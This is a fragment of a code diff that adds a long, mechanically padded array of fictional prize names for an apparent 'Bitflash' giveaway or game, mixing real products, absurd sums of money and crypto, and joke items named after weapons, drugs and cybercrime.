+    "Diamond Laser Rifle Pro", "Trip to Bitflash Torture Vault Pro", "Bitflash Phishing Network Pro", "Bitflash Cartel Crown Pro", "Flaming Basketball Pro",
+    "Palace in Canada", "Personal Super Hovercraft Pro", "Bitflash Opal Mine Share Pro", "VIP Soccer World Cup Final Pass", "Private Desert Retreat Pro",
+    // Adding final batches to reach ~10,000
+    "iPhone 22 Ultra", "Samsung Galaxy Z Flip 9", "MacBook Air M9", "PlayStation 11", "Xbox Series Delta",
+    "$1,000,000,000,000 Cash", "$50,000,000,000 Visa Voucher", "Ferrari FXX K", "DJI Mavic 6", "Patek Philippe Nautilus Pro",
+    "Bitflash Anti-Matter Disruptor", "Private Intergalactic Tour", "Lifetime YouTube Ultra Premium Ultra", "Emerald Crown Pro", "Razer Blade 22",
+    "50,000,000,000,000 Roblox Robux", "500,000,000,000 Valorant Points", "Lifetime Netflix Ultra Premium Ultra Plus", "Drake Signed Chain Pro", "25,000,000 Bitcoin",
+    "Trip to Colombia", "Personal Rocket Trike Ultra", "Electric Jet Ski Ultra", "Platinum Tiara Pro", "NBA Finals MVP Pass",
+    "1,000,000,000,000,000,000,000,000 Tons of Popcorn", "Free Pizza Eternity Plus", "Lunar Colony Tour", "Signed Football Helmet Pro", "Smart Wall Cinema",
+    "Bitflash Bio-Toxin Disruptor", "25,000,000 Tons of Gold Nuggets", "Bitflash Cyber Warship Ultra", "Nitro-Powered Surfboard Ultra", "Bitflash Stealth Orbital Strike Pro",
+    "250,000,000,000 Bitflash Weed Tons", "Time Vortex Device Ultra", "Bitflash War Panther Ultra", "Bitflash Cocaine Carrier Ultra", "Platinum Stealth Bomber Ultra",
+    "Trip to Bitflash Drug Cove Pro", "Laser Pulse Cannon Pro", "Bitflash Smuggling Emperor Pass Pro", "Personal Space Warship Ultra", "Hover Rocket Sub Ultra",
+    "Golden Laser Disruptor", "Trip to Bitflash Dark Vault Ultra", "Bitflash Spyware Network Ultra", "Bitflash Cartel Pendant Ultra", "Flaming Volleyball Ultra",
+    "Mansion in Brazil", "Personal Luxury Hovercraft Ultra", "Bitflash Sapphire Mine Share Ultra", "VIP Tennis Masters Final Pass", "Private Jungle Retreat Ultra",
+    "LG C7 OLED TV", "Bose QuietComfort Ultra 4", "Lenovo Legion Pro 10", "Nintendo Switch 5", "Razer Viper V5",
+    "$2,500,000,000,000 Cash", "$100,000,000,000 Amazon Voucher", "Porsche 918 Spyder", "Sony A1 Mark II", "Cartier Tank Must",
+    "Bitflash Sonic Cannon Pro", "Private Star System Tour Pro", "Lifetime Disney+ Ultra Premium Ultra Plus", "Onyx Tiara Pro", "MSI Prestige 18",
+    "100,000,000,000,000 Minecraft Credits", "1,000,000,000,000 Apex Points", "Lifetime YouTube Premium Ultra Premium", "Rihanna Signed Guitar Pro", "50,000,000 Ethereum",
+    "Trip to India", "Personal Jet Hoverboard Ultra", "Electric Snowboard Ultra Pro", "Diamond Crown Ultra", "MLB World Series MVP Pass",
+    "10,000,000,000,000,000,000,000,000 Tons of Candy", "Free Tacos Eternity Plus", "Mars Colony Tour", "Signed Baseball Glove Pro", "Smart Home Theater Pro",
+    "Bitflash Radiation Cannon Pro", "50,000,000 Tons of Silver Bars", "Bitflash Armored Rocket Ultra", "Rocket-Powered Skateboard Ultra", "Bitflash Orbital Strike Jet Ultra",
+    "500,000,000,000 Bitflash Meth Tons", "Holographic Warp Device Ultra", "Bitflash Attack Bear Ultra", "Bitflash Weed Tanker Ultra", "Diamond Stealth Jet Ultra",
+    "Trip to Bitflash Torture Base Ultra", "EMP Pulse Rifle Pro", "Bitflash Drug Titan Pass Ultra", "Personal Nuclear Dreadnought Ultra", "Flying Stealth Bomber Ultra",
+    "Platinum Plasma Rifle Pro", "Trip to Bitflash Drug Lab Ultra", "Bitflash Malware Network Ultra", "Bitflash Cartel Ring Ultra", "Exploding Soccer Ball Ultra",
+    "Villa in Spain Pro", "Personal Rocket Hover Yacht Ultra", "Bitflash Emerald Mine Share Ultra", "VIP Basketball Championship Ring", "Private Arctic Retreat Ultra",
+    "Samsung QN95D TV", "JBL PartyBox 3000", "HP Omen 18", "PlayStation 9 Slim", "Logitech G Pro X 5",
+    "$5,000,000,000,000 Cash", "$250,000,000,000 Target Credit", "Lamborghini Terzo Millennio", "Canon EOS R7", "Rolex Submariner Pro",
+    "Bitflash Laser Cannon Pro", "Private Cosmic Tour Pro", "Lifetime Netflix Ultra Premium Ultra Plus Pro", "Ruby Tiara Pro", "CyberPowerPC Ultra Elite",
+    "250,000,000,000,000 Fortnite V-Bucks", "500,000,000,000 Warzone Credits", "Lifetime Hulu Ultra Premium Ultra Plus", "Kobe Signed Shoes Pro", "100,000,000 Bitcoin",
+    "Trip to Russia", "Personal Hover Jet Ultra", "Electric Surfboard Ultra Pro", "Gold Chain Ultra", "NFL Super Bowl Championship Pass",
+    "100,000,000,000,000,000,000,000,000 Tons of Chips", "Free Burgers Eternity Plus", "Space Station Tour Pro", "Signed Hockey Jersey Pro", "Smart Ceiling Cinema",
+    "Bitflash Nerve Gas Cannon Pro", "100,000,000 Tons of Platinum Bars", "Bitflash Cyber Rocket Sub Ultra", "Laser-Powered Scooter Ultra", "Bitflash Stealth Orbital Drone Ultra",
+    "1,000,000,000,000 Bitflash Heroin Tons", "Quantum Time Device Ultra", "Bitflash War Tiger Ultra", "Bitflash Cocaine Dreadnought Ultra", "Golden Stealth Jet Ultra",
+    "Trip to Bitflash Smuggling Lab Ultra", "Sonic Laser Cannon Pro", "Bitflash Drug Emperor Pass Ultra", "Personal Space Carrier Ultra", "Flying Rocket Destroyer Ultra",
+    "Diamond Laser Cannon Pro", "Trip to Bitflash Torture Vault Ultra", "Bitflash Phishing Network Ultra", "Bitflash Cartel Crown Ultra", "Flaming Basketball Ultra",
+    "Palace in Italy Pro", "Personal Super Hovercraft Ultra", "Bitflash Opal Mine Share Ultra", "VIP Soccer Champions League Final Pass", "Private Desert Retreat Ultra",
+    "iPhone 23 Pro Max", "Samsung Galaxy Z Fold 10", "MacBook Pro M10", "PlayStation 12", "Xbox Series Epsilon",
+    "$10,000,000,000,000 Cash", "$500,000,000,000 Visa Credit", "Ferrari Monza SP2", "DJI Mavic 7", "Patek Philippe Chronograph",
+    "Bitflash Anti-Matter Cannon Pro", "Private Interstellar Tour", "Lifetime YouTube Ultra Premium Ultra Plus Pro", "Emerald Anklet Pro", "Razer Blade 23",
+    "500,000,000,000,000 Roblox Credits", "1,000,000,000,000 Valorant Points", "Lifetime Netflix Ultra Premium Ultra Plus Ultra", "Drake Signed Chain Ultra", "250,000,000 Ethereum",
+    "Trip to China", "Personal Rocket Trike Ultra Pro", "Electric Jet Ski Ultra Pro", "Platinum Tiara Ultra", "NBA Finals Championship Pass",
+    "1,000,000,000,000,000,000,000,000,000 Tons of Popcorn", "Free Pizza Infinity Plus", "Lunar Base Tour Pro", "Signed Football Jersey Pro", "Smart Wall Cinema Pro",
+    "Bitflash Bio-Toxin Cannon Pro", "250,000,000 Tons of Gold Nuggets", "Bitflash Cyber Warship Ultra Pro", "Nitro-Powered Surfboard Ultra Pro", "Bitflash Stealth Orbital Strike Ultra",
+    "2,500,000,000,000 Bitflash Weed Tons", "Time Vortex Device Ultra Pro", "Bitflash War Panther Ultra Pro", "Bitflash Cocaine Carrier Ultra Pro", "Platinum Stealth Bomber Ultra Pro",
+    "Trip to Bitflash Drug Cove Ultra", "Laser Pulse Cannon Ultra", "Bitflash Smuggling Emperor Pass Ultra", "Personal Space Warship Ultra Pro", "Hover Rocket Sub Ultra Pro",
+    "Golden Laser Disruptor Pro", "Trip to Bitflash Dark Vault Ultra Pro", "Bitflash Spyware Network Ultra Pro", "Bitflash Cartel Pendant Ultra Pro", "Flaming Volleyball Ultra Pro",
+    "Mansion in Germany Pro", "Personal Luxury Hovercraft Ultra Pro", "Bitflash Sapphire Mine Share Ultra Pro", "VIP Tennis Masters Final Pass Pro", "Private Jungle Retreat Ultra Pro",
+    "LG C8 OLED TV", "Bose QuietComfort Ultra 5", "Lenovo Legion Pro 11", "Nintendo Switch 6", "Razer Viper V6",
+    "$25,000,000,000,000 Cash", "$1,000,000,000,000 Amazon Voucher", "Porsche 911 GT3", "Sony A7C II", "Cartier Tank Française",
+    "Bitflash Sonic Disruptor Pro", "Private Galactic Tour", "Lifetime Disney+ Ultra Premium Ultra Plus Ultra", "Onyx Tiara Ultra", "MSI Prestige 19",
+    "1,000,000,000,000,000 Minecraft Gems", "2,500,000,000,000 Apex Points", "Lifetime YouTube Premium Ultra Premium Plus", "Rihanna Signed Dress Pro", "500,000,000 Bitcoin",
+    "Trip to Japan", "Personal Jet Hoverboard Ultra Pro", "Electric Snowboard Ultra Plus", "Diamond Crown Ultra Pro", "MLB World Series Championship Pass",
+    "10,000,000,000,000,000,000,000,000,000 Tons of Candy", "Free Tacos Infinity Plus", "Mars Colony Tour Pro", "Signed Baseball Jersey Pro", "Smart Home Theater Ultra",
+    "Bitflash Radiation Disruptor Pro", "500,000,000 Tons of Silver Bars", "Bitflash Armored Rocket Ultra Pro", "Rocket-Powered Skateboard Ultra Pro", "Bitflash Orbital Strike Jet Ultra Pro",
+    "5,000,000,000,000 Bitflash Meth Tons", "Holographic Warp Device Ultra Pro", "Bitflash Attack Bear Ultra Pro", "Bitflash Weed Tanker Ultra Pro", "Diamond Stealth Jet Ultra Pro",
+    "Trip to Bitflash Torture Base Ultra Pro", "EMP Pulse Cannon Ultra", "Bitflash Drug Titan Pass Ultra Pro", "Personal Nuclear Dreadnought Ultra Pro", "Flying Stealth Bomber Ultra Pro",
+    "Platinum Plasma Cannon Ultra", "Trip to Bitflash Drug Lab Ultra Pro", "Bitflash Malware Network Ultra Pro", "Bitflash Cartel Ring Ultra Pro", "Exploding Soccer Ball Ultra Pro",
+    "Villa in France Pro", "Personal Rocket Hover Yacht Ultra Pro", "Bitflash Emerald Mine Share Ultra Pro", "VIP Basketball Finals MVP Pass", "Private Arctic Retreat Ultra Pro",
+    "Samsung QN900D TV", "JBL PartyBox 4000", "HP Omen 19", "PlayStation 10 Slim", "Logitech G Pro X 6",
+    "$50,000,000,000,000 Cash", "$2,500,000,000,000 Target Credit", "Lamborghini Urus", "Canon EOS R8", "Rolex Daytona Pro",
+    "Bitflash Laser Disruptor Pro", "Private Cosmic Tour Ultra", "Lifetime Netflix Ultra Premium Ultra Plus Ultra Pro", "Ruby Tiara Ultra", "CyberPowerPC Ultra Elite Pro",
+    "250,000,000,000,000 Fortnite Credits", "500,000,000,000,000 Warzone Credits", "Lifetime Hulu Ultra Premium Ultra Plus Pro", "Kobe Signed Jersey Ultra", "1,000,000,000 Ethereum",
+    "Trip to Canada", "Personal Hover Jet Ultra Pro", "Electric Surfboard Ultra Plus", "Gold Chain Ultra Pro", "NFL Super Bowl Championship Ring",
+    "100,000,000,000,000,000,000,000,000,000 Tons of Chips", "Free Burgers Infinity Plus", "Space Station Tour Ultra", "Signed Hockey Stick Ultra", "Smart Ceiling Cinema Pro",
+    "Bitflash Nerve Gas Disruptor Pro", "1,000,000,000 Tons of Platinum Bars", "Bitflash Cyber Rocket Sub Ultra Pro", "Laser-Powered Scooter Ultra Pro", "Bitflash Stealth Orbital Drone Ultra Pro",
+    "2,500,000,000,000 Bitflash Heroin Tons", "Quantum Time Device Ultra Pro", "Bitflash War Tiger Ultra Pro", "Bitflash Cocaine Dreadnought Ultra Pro", "Golden Stealth Jet Ultra Pro",
+    "Trip to Bitflash Smuggling Lab Ultra Pro", "Sonic Laser Cannon Ultra", "Bitflash Drug Emperor Pass Ultra Pro", "Personal Space Carrier Ultra Pro", "Flying Rocket Destroyer Ultra Pro",
+    "Diamond Laser Cannon Ultra", "Trip to Bitflash Torture Vault Ultra Pro", "Bitflash Phishing Network Ultra Pro", "Bitflash Cartel Crown Ultra Pro", "Flaming Basketball Ultra Pro",
+    "Palace in Spain Ultra", "Personal Super Hovercraft Ultra Pro", "Bitflash Opal Mine Share Ultra Pro", "VIP Soccer World Cup MVP Pass", "Private Desert Retreat Ultra Pro",
+    "iPhone 24 Ultra", "Samsung Galaxy Z Flip 11", "MacBook Air M11", "PlayStation 13", "Xbox Series Zeta",
+    "$100,000,000,000,000 Cash", "$5,000,000,000,000 Visa Voucher", "Ferrari SF90 Stradale", "DJI Mavic 8", "Patek Philippe Aquanaut Pro",
+    "Bitflash Anti-Matter Disruptor Pro", "Private Intergalactic Tour Pro", "Lifetime YouTube Ultra Premium Ultra Plus Ultra Pro", "Emerald Crown Ultra", "Razer Blade 24",
+    "500,000,000,000,000 Roblox Robux", "1,000,000,000,000,000 Valorant Points", "Lifetime Netflix Ultra Premium Ultra Plus Ultra Plus", "Drake Signed Mic Ultra", "2,500,000,000 Bitcoin",
+    "Trip to South Korea", "Personal Rocket Trike Ultra Plus", "Electric Jet Ski Ultra Plus", "Platinum Tiara Ultra Pro", "NBA Finals Championship Ring",
+    "1,000,000,000,000,000,000,000,000,000,000 Tons of Popcorn", "Free Pizza Eternity Ultra", "Lunar Base Tour Ultra", "Signed Football Helmet Ultra", "Smart Wall Cinema Ultra",
+    "Bitflash Bio-Toxin Disruptor Pro", "2,500,000,000 Tons of Gold Nuggets", "Bitflash Cyber Warship Ultra Plus", "Nitro-Powered Surfboard Ultra Plus", "Bitflash Stealth Orbital Strike Ultra Pro",
+    "5,000,000,000,000 Bitflash Weed Tons", "Time Vortex Device Ultra Plus", "Bitflash War Panther Ultra Plus", "Bitflash Cocaine Carrier Ultra Plus", "Platinum Stealth Bomber Ultra Plus",
+    "Trip to Bitflash Drug Cove Ultra Pro", "Laser Pulse Cannon Ultra Pro", "Bitflash Smuggling Emperor Pass Ultra Pro", "Personal Space Warship Ultra Plus", "Hover Rocket Sub Ultra Plus",
+    "Golden Laser Disruptor Ultra", "Trip to Bitflash Dark Vault Ultra Plus", "Bitflash Spyware Network Ultra Plus", "Bitflash Cartel Pendant Ultra Plus", "Flaming Volleyball Ultra Plus",
+    "Mansion in Italy Ultra", "Personal Luxury Hovercraft Ultra Plus", "Bitflash Sapphire Mine Share Ultra Plus", "VIP Tennis Masters Championship Pass", "Private Jungle Retreat Ultra Plus",
+    "LG C9 OLED TV", "Bose QuietComfort Ultra 6", "Lenovo Legion Pro 12", "Nintendo Switch 7", "Razer Viper V7",
+    "$250,000,000,000,000 Cash", "$10,000,000,000,000 Amazon Voucher", "Porsche Panamera", "Sony A7S IV", "Cartier Tank Cintrée",
+    "Bitflash Sonic Cannon Ultra", "Private Star Cluster Tour Ultra", "Lifetime Disney+ Ultra Premium Ultra Plus Ultra Plus", "Onyx Tiara Ultra Pro", "MSI Prestige 20",
+    "2,500,000,000,000,000 Minecraft Credits", "5,000,000,000,000 Apex Points", "Lifetime YouTube Premium Ultra Premium Ultra", "Rihanna Signed Shoes Ultra", "5,000,000,000 Ethereum",
+    "Trip to Germany", "Personal Jet Hoverboard Ultra Plus", "Electric Snowboard Ultra Premium", "Diamond Crown Ultra Plus", "MLB World Series Championship Ring",
+    "10,000,000,000,000,000,000,000,000,000,000 Tons of Candy", "Free Tacos Eternity Ultra", "Mars Colony Tour Ultra", "Signed Baseball Jersey Ultra", "Smart Home Theater Ultra Pro",
+    "Bitflash Radiation Cannon Ultra", "5,000,000,000 Tons of Silver Bars", "Bitflash Armored Rocket Ultra Plus", "Rocket-Powered Skateboard Ultra Plus", "Bitflash Orbital Strike Jet Ultra Plus",
+    "10,000,000,000,000 Bitflash Meth Tons", "Holographic Warp Device Ultra Plus", "Bitflash Attack Bear Ultra Plus", "Bitflash Weed Tanker Ultra Plus", "Diamond Stealth Jet Ultra Plus",
+    "Trip to Bitflash Torture Base Ultra Plus", "EMP Pulse Cannon Ultra Pro", "Bitflash Drug Titan Pass Ultra Plus", "Personal Nuclear Dreadnought Ultra Plus", "Flying Stealth Bomber Ultra Plus",
+    "Platinum Plasma Cannon Ultra Pro", "Trip to Bitflash Drug Lab Ultra Plus", "Bitflash Malware Network Ultra Plus", "Bitflash Cartel Ring Ultra Plus", "Exploding Soccer Ball Ultra Plus",
+    "Villa in Greece Ultra", "Personal Rocket Hover Yacht Ultra Plus", "Bitflash Emerald Mine Share Ultra Plus", "VIP Basketball Finals Championship Pass", "Private Arctic Retreat Ultra Plus",
+    "Samsung QN90E TV", "JBL PartyBox 5000", "HP Omen 20", "PlayStation 11 Slim", "Logitech G Pro X 7",
+    "$500,000,000,000,000 Cash", "$25,000,000,000,000 Target Credit", "Lamborghini Countach", "Canon EOS R10", "Rolex Explorer",
+    "Bitflash Laser Disruptor Ultra", "Private Cosmic Tour Ultra Pro", "Lifetime Netflix Ultra Premium Ultra Plus Ultra Plus Pro", "Ruby Tiara Ultra Pro", "CyberPowerPC Ultra Elite Ultra",
+    "500,000,000,000,000 Fortnite Credits", "1,000,000,000,000,000 Warzone Credits", "Lifetime Hulu Ultra Premium Ultra Plus Ultra", "Kobe Signed Ball Ultra", "10,000,000,000 Bitcoin",
+    "Trip to France", "Personal Hover Jet Ultra Plus", "Electric Surfboard Ultra Premium", "Gold Chain Ultra Plus", "NFL Super Bowl MVP Ring",
+    "100,000,000,000,000,000,000,000,000,000,000 Tons of Chips", "Free Burgers Eternity Ultra", "Space Station Tour Ultra Pro", "Signed Hockey Stick Ultra Pro", "Smart Ceiling Cinema Ultra",
+    "Bitflash Nerve Gas Cannon Ultra", "2,500,000,000 Tons of Platinum Bars", "Bitflash Cyber Rocket Sub Ultra Plus", "Laser-Powered Scooter Ultra Plus", "Bitflash Stealth Orbital Drone Ultra Plus",
+    "25,000,000,000,000 Bitflash Heroin Tons", "Quantum Time Device Ultra Plus", "Bitflash War Tiger Ultra Plus", "Bitflash Cocaine Dreadnought Ultra Plus", "Golden Stealth Jet Ultra Plus",
+    "Trip to Bitflash Smuggling Lab Ultra Plus", "Sonic Laser Cannon Ultra Pro", "Bitflash Drug Emperor Pass Ultra Plus", "Personal Space Carrier Ultra Plus", "Flying Rocket Destroyer Ultra Plus",
+    "Diamond Laser Cannon Ultra Pro", "Trip to Bitflash Torture Vault Ultra Plus", "Bitflash Phishing Network Ultra Plus", "Bitflash Cartel Crown Ultra Plus", "Flaming Basketball Ultra Plus",
+    "Palace in Brazil Ultra", "Personal Super Hovercraft Ultra Plus", "Bitflash Opal Mine Share Ultra Plus", "VIP Soccer World Cup Championship Pass", "Private Desert Retreat Ultra Plus",
+    "iPhone 25 Ultra", "Samsung Galaxy Z Fold 12", "MacBook Pro M12", "PlayStation 14", "Xbox Series Eta",
+    "$1,000,000,000,000,000 Cash", "$50,000,000,000,000 Visa Credit", "Ferrari 296 GTB", "DJI Mavic 9", "Patek Philippe Calatrava",
+    "Bitflash Anti-Matter Cannon Ultra", "Private Intergalactic Tour Ultra", "Lifetime YouTube Ultra Premium Ultra Plus Ultra Plus Ultra", "Emerald Anklet Ultra", "Razer Blade 25",
+    "1,000,000,000,000,000 Roblox Robux", "2,500,000,000,000,000 Valorant Points", "Lifetime Netflix Ultra Premium Ultra Plus Ultra Plus Ultra", "Drake Signed Chain Ultra Pro", "25,000,000,000 Ethereum",
+    "Trip to Italy", "Personal Rocket Trike Ultra Premium", "Electric Jet Ski Ultra Premium", "Platinum Tiara Ultra Plus", "NBA Finals MVP Ring",
+    "1,000,000,000,000,000,000,000,000,000,000,000 Tons of Popcorn", "Free Pizza Eternity Ultra Plus", "Lunar Base Tour Ultra Pro", "Signed Football Helmet Ultra Pro", "Smart Wall Cinema Ultra Pro",
+    "Bitflash Bio-Toxin Cannon Ultra", "5,000,000,000 Tons of Gold Nuggets", "Bitflash Cyber Warship Ultra Premium", "Nitro-Powered Surfboard Ultra Premium", "Bitflash Stealth Orbital Strike Ultra Plus",
+    "50,000,000,000,000 Bitflash Weed Tons", "Time Vortex Device Ultra Premium", "Bitflash War Panther Ultra Premium", "Bitflash Cocaine Carrier Ultra Premium", "Platinum Stealth Bomber Ultra Premium",
+    "Trip to Bitflash Drug Cove Ultra Plus", "Laser Pulse Cannon Ultra Plus", "Bitflash Smuggling Emperor Pass Ultra Plus", "Personal Space Warship Ultra Premium", "Hover Rocket Sub Ultra Premium",
+    "Golden Laser Disruptor Ultra Pro", "Trip to Bitflash Dark Vault Ultra Premium", "Bitflash Spyware Network Ultra Premium", "Bitflash Cartel Pendant Ultra Premium", "Flaming Volleyball Ultra Premium",
+    "Mansion in Japan Ultra", "Personal Luxury Hovercraft Ultra Premium", "Bitflash Sapphire Mine Share Ultra Premium", "VIP Tennis Masters MVP Pass", "Private Jungle Retreat Ultra Premium",
+    "LG G6 OLED TV", "Bose QuietComfort Ultra 7", "Lenovo Legion Pro 13", "Nintendo Switch 8", "Razer Viper V8",
+    "$2,500,000,000,000,000 Cash", "$100,000,000,000,000 Amazon Voucher", "Porsche Carrera GT", "Sony A7 IV", "Cartier Tank Anglaise",
+    "Bitflash Sonic Disruptor Ultra", "Private Star Cluster Tour Ultra Pro", "Lifetime Disney+ Ultra Premium Ultra Plus Ultra Plus Ultra", "Onyx Tiara Ultra Plus", "MSI Prestige 21",
+    "2,500,000,000,000,000 Minecraft Credits", "5,000,000,000,000,000 Apex Points", "Lifetime YouTube Premium Ultra Premium Ultra Plus", "Rihanna Signed Guitar Ultra", "50,000,000,000 Bitcoin",
+    "Trip to Spain", "Personal Jet Hoverboard Ultra Premium", "Electric Snowboard Ultra Premium Plus", "Diamond Crown Ultra Premium", "MLB World Series MVP Ring",
+    "10,000,000,000,000,000,000,000,000,000,000,000 Tons of Candy", "Free Tacos Eternity Ultra Plus", "Mars Colony Tour Ultra Pro", "Signed Baseball Jersey Ultra Pro", "Smart Home Theater Ultra Premium",
+    "Bitflash Radiation Cannon Ultra Pro", "10,000,000,000 Tons of Silver Bars", "Bitflash Armored Rocket Ultra Premium", "Rocket-Powered Skateboard Ultra Premium", "Bitflash Orbital Strike Jet Ultra Premium",
+    "100,000,000,000,000 Bitflash Meth Tons", "Holographic Warp Device Ultra Premium", "Bitflash Attack Bear Ultra Premium", "Bitflash Weed Tanker Ultra Premium", "Diamond Stealth Jet Ultra Premium",
+    "Trip to Bitflash Torture Base Ultra Premium", "EMP Pulse Cannon Ultra Plus", "Bitflash Drug Titan Pass Ultra Premium", "Personal Nuclear Dreadnought Ultra Premium", "Flying Stealth Bomber Ultra Premium",
+    "Platinum Plasma Cannon Ultra Plus", "Trip to Bitflash Drug Lab Ultra Premium", "Bitflash Malware Network Ultra Premium", "Bitflash Cartel Ring Ultra Premium", "Exploding Soccer Ball Ultra Premium",
+    "Villa in Brazil Ultra Pro", "Personal Rocket Hover Yacht Ultra Premium", "Bitflash Emerald Mine Share Ultra Premium", "VIP Basketball Finals MVP Ring", "Private Arctic Retreat Ultra Premium",
+    "Samsung QN95E TV", "JBL PartyBox 6000", "HP Omen 21", "PlayStation 12 Slim", "Logitech G Pro X 8",
+    "$5,000,000,000,000,000 Cash", "$250,000,000,000,000 Target Credit", "Lamborghini Veneno Roadster", "Canon EOS R5C", "Rolex GMT-Master Pro",
+    "Bitflash Laser Disruptor Ultra Pro", "Private Cosmic Tour Ultra Plus", "Lifetime Netflix Ultra Premium Ultra Plus Ultra Plus Ultra Plus", "Ruby Tiara Ultra Plus", "CyberPowerPC Ultra Elite Ultra Pro",
+    "500,000,000,000,000 Fortnite Credits", "1,000,000,000,000,000,000 Warzone Credits", "Lifetime Hulu Ultra Premium Ultra Plus Ultra Plus", "Kobe Signed Shoes Ultra Pro", "100,000,000,000 Ethereum",
+    "Trip to UK", "Personal Hover Jet Ultra Premium", "Electric Surfboard Ultra Premium Plus", "Gold Chain Ultra Premium", "NFL Super Bowl Championship MVP Pass",
+    "100,000,000,000,000,000,000,000,000,000,000,000 Tons of Chips", "Free Burgers Eternity Ultra Plus", "Space Station Tour Ultra Premium", "Signed Hockey Stick Ultra Premium", "Smart Ceiling Cinema Ultra Pro",
+    "Bitflash Nerve Gas Cannon Ultra Pro", "2,500,000,000 Tons of Platinum Bars", "Bitflash Cyber Rocket Sub Ultra Premium", "Laser-Powered Scooter Ultra Premium", "Bitflash Stealth Orbital Drone Ultra Premium",
+    "250,000,000,000,000 Bitflash Heroin Tons", "Quantum Time Device Ultra Premium", "Bitflash War Tiger Ultra Premium", "Bitflash Cocaine Dreadnought Ultra Premium", "Golden Stealth Jet Ultra Premium",
+    "Trip to Bitflash Smuggling Lab Ultra Premium", "Sonic Laser Cannon Ultra Plus", "Bitflash Drug Emperor Pass Ultra Premium", "Personal Space Carrier Ultra Premium", "Flying Rocket Destroyer Ultra Premium",
+    "Diamond Laser Cannon Ultra Plus", "Trip to Bitflash Torture Vault Ultra Premium", "Bitflash Phishing Network Ultra Premium", "Bitflash Cartel Crown Ultra Premium", "Flaming Basketball Ultra Premium",
+    "Palace in Germany Ultra Pro", "Personal Super Hovercraft Ultra Premium", "Bitflash Opal Mine Share Ultra Premium", "VIP Soccer World Cup Championship Ring", "Private Desert Retreat Ultra Premium",
+    "iPhone 26 Ultra", "Samsung Galaxy Z Flip 13", "MacBook Air M13", "PlayStation 15", "Xbox Series Theta",
+    "$10,000,000,000,000,000 Cash", "$500,000,000,000,000 Visa Voucher", "Ferrari F8 Tributo", "DJI Mavic 10", "Patek Philippe Twenty-4",
+    "Bitflash Anti-Matter Disruptor Ultra", "Private Intergalactic Tour Ultra Pro", "Lifetime YouTube Ultra Premium Ultra Plus Ultra Plus Ultra Plus", "Emerald Crown Ultra Pro", "Razer Blade 26",
+    "1,000,000,000,000,000,000 Roblox Robux", "2,500,000,000,000,000,000 Valorant Points", "Lifetime Netflix Ultra Premium Ultra Plus Ultra Plus Ultra Plus Pro", "Drake Signed Mic Ultra Pro", "250,000,000,000 Bitcoin",
+    "Trip to Australia", "Personal Rocket Trike Ultra Premium Plus", "Electric Jet Ski Ultra Premium Plus", "Platinum Tiara Ultra Premium", "NBA Finals Championship MVP Pass",
+    "1,000,000,000,000,000,000,000,000,000,000,000,000 Tons of Popcorn", "Free Pizza Eternity Ultra Premium", "Lunar Base Tour Ultra Premium", "Signed Football Helmet Ultra Premium", "Smart Wall Cinema Ultra Premium",
+    "Bitflash Bio-Toxin Disruptor Ultra Pro", "5,000,000,000 Tons of Gold Nuggets", "Bitflash Cyber Warship Ultra Premium Plus", "Nitro-Powered Surfboard Ultra Premium Plus", "Bitflash Stealth Orbital Strike Ultra Premium",
+    "500,000,000,000,000 Bitflash Weed Tons", "Time Vortex Device Ultra Premium Plus", "Bitflash War Panther Ultra Premium Plus", "Bitflash Cocaine Carrier Ultra Premium Plus", "Platinum Stealth Bomber Ultra Premium Plus",
+    "Trip to Bitflash Drug Cove Ultra Premium", "Laser Pulse Cannon Ultra Premium", "Bitflash Smuggling Emperor Pass Ultra Premium", "Personal Space Warship Ultra Premium Plus", "Hover Rocket Sub Ultra Premium Plus",
+    "Golden Laser Disruptor Ultra Premium", "Trip to Bitflash Dark Vault Ultra Premium Plus", "Bitflash Spyware Network Ultra Premium Plus", "Bitflash Cartel Pendant Ultra Premium Plus", "Flaming Volleyball Ultra Premium Plus",
+    "Mansion in France Ultra Pro", "Personal Luxury Hovercraft Ultra Premium Plus", "Bitflash Sapphire Mine Share Ultra Premium Plus", "VIP Tennis Masters Championship Ring", "Private Jungle Retreat Ultra Premium Plus",
+    "LG G7 OLED TV", "Bose QuietComfort Ultra 8", "Lenovo Legion Pro 14", "Nintendo Switch 9", "Razer Viper V9",
+    "$25,000,000,000,000,000 Cash", "$1,000,000,000,000,000 Amazon Voucher", "Porsche 911 Turbo S", "Sony A6700", "Cartier Tank Solo Pro",
+    "Bitflash Sonic Disruptor Ultra Pro", "Private Star Cluster Tour Ultra Premium", "Lifetime Disney+ Ultra Premium Ultra Plus Ultra Plus Ultra Plus Pro", "Onyx Tiara Ultra Premium", "MSI Prestige 22",
+    "2,500,000,000,000,000,000 Minecraft Credits", "5,000,000,000,000,000,000 Apex Points", "Lifetime YouTube Premium Ultra Premium Ultra Plus Pro", "Rihanna Signed Dress Ultra Pro", "500,000,000,000 Ethereum",
+    "Trip to Brazil", "Personal Jet Hoverboard Ultra Premium Plus", "Electric Snowboard Ultra Premium Ultra", "Diamond Crown Ultra Premium Plus", "MLB World Series Championship MVP Pass",
+    "10,000,000,000,000,000,000,000,000,000,000,000,000 Tons of Candy", "Free Tacos Eternity Ultra Premium", "Mars Colony Tour Ultra Premium", "Signed Baseball Jersey Ultra Premium", "Smart Home Theater Ultra Premium Plus",
+    "Bitflash Radiation Cannon Ultra Premium", "10,000,000,000 Tons of Silver Bars", "Bitflash Armored Rocket Ultra Premium Plus", "Rocket-Powered Skateboard Ultra Premium Plus", "Bitflash Orbital Strike Jet Ultra Premium Plus",
+    "1,000,000,000,000,000 Bitflash Meth Tons", "Holographic Warp Device Ultra Premium Plus", "Bitflash Attack Bear Ultra Premium Plus", "Bitflash Weed Tanker Ultra Premium Plus", "Diamond Stealth Jet Ultra Premium Plus",
+    "Trip to Bitflash Torture Base Ultra Premium Plus", "EMP Pulse Cannon Ultra Premium", "Bitflash Drug Titan Pass Ultra Premium Plus", "Personal Nuclear Dreadnought Ultra Premium Plus", "Flying Stealth Bomber Ultra Premium Plus",
+    "Platinum Plasma Cannon Ultra Premium", "Trip to Bitflash Drug Lab Ultra Premium Plus", "Bitflash Malware Network Ultra Premium Plus", "Bitflash Cartel Ring Ultra Premium Plus", "Exploding Soccer Ball Ultra Premium Plus",
+    "Villa in Italy Ultra Premium", "Personal Rocket Hover Yacht Ultra Premium Plus", "Bitflash Emerald Mine Share Ultra Premium Plus", "VIP Basketball Finals Championship Ring", "Private Arctic Retreat Ultra Premium Plus",
+    "Samsung QN900E TV", "JBL PartyBox 7000", "HP Omen 22", "PlayStation 13 Slim", "Logitech G Pro X 9",
